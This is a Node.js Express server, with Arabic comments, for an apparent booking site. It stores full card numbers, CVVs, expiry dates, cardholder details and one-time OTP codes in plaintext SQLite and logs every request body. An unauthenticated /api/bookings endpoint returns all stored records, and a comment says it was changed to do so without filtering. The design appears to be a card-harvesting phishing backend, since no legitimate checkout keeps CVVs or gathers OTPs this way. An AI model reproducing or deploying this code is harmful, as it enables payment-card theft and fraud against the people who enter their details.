const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'frontend')));

const db = new sqlite3.Database('./database.db', (err) => {
  if (err) console.error('Database error:', err);
  else console.log('📦 Connected to SQLite database');
});

db.run(`CREATE TABLE IF NOT EXISTS bookings (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  first_name TEXT,
  last_name TEXT,
  phone TEXT,
  email TEXT,
  address TEXT,
  card_number TEXT,
  card_last4 TEXT,
  card_brand TEXT,
  card_expiry TEXT,
  cvv TEXT,
  name_on_card TEXT,
  amount REAL,
  status TEXT DEFAULT 'pending',
  otp TEXT,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

app.post('/api/book', (req, res) => {
  const { firstName, lastName, phone, email, address, cardNumber, cardExpiry, cardBrand, cvv, nameOnCard, amount } = req.body;

  // 🔥 إضافة لفحص البيانات المستقبلة
  console.log('البيانات المستقبلة:', req.body);

  // التحقق من وجود جميع البيانات المطلوبة
  if (!cardNumber || !cvv || !nameOnCard) {
    console.error('بيانات ناقصة:', { cardNumber, cvv, nameOnCard });
    return res.status(400).json({ error: 'بيانات البطاقة ناقصة' });
  }

  const last4 = cardNumber.slice(-4);

  const sql = `INSERT INTO bookings
    (first_name, last_name, phone, email, address,
     card_number, card_last4, card_brand, card_expiry, cvv, name_on_card, amount)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;

  const params = [firstName, lastName, phone, email, address, cardNumber, last4, cardBrand, cardExpiry, cvv, nameOnCard, amount];

  console.log('بيانات الإدخال:', params);

  db.run(sql, params, function(err){
    if(err){
      console.error('DB Insert Error:', err);
      return res.status(500).json({ error: err.message });
    }
    console.log('تم إدخال الحجز برقم:', this.lastID);
    res.json({ success: true, bookingId: this.lastID });
  });
});

app.post('/api/set-otp', (req, res) => {
  const { bookingId, otp } = req.body;
  db.run(`UPDATE bookings SET otp=? WHERE id=?`, [otp, bookingId], (err) => {
    if(err) return res.status(500).json({ error: 'DB error' });
    res.json({ success: true });
  });
});

// 🔥 تعديل هذا الجزء - إرجاع جميع البيانات بدون تصفية
app.get('/api/bookings', (req, res) => {
  db.all(`SELECT * FROM bookings ORDER BY created_at DESC`, [], (err, rows) => {
    if(err) return res.status(500).json({ error: 'DB error' });
    res.json(rows);
  });
});

app.post('/api/verify-otp', (req, res) => {
  const { bookingId, otp } = req.body;
  db.get(`SELECT otp FROM bookings WHERE id=?`, [bookingId], (err, row) => {
    if(err) return res.status(500).json({ error: 'DB error' });
    if(!row || row.otp !== otp) return res.status(400).json({ error: 'الكود غير صحيح' });
    db.run(`UPDATE bookings SET status='confirmed' WHERE id=?`, [bookingId], (err2) => {
      if(err2) return res.status(500).json({ error: 'DB error' });
      res.json({ success: true });
    });
  });
});

app.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));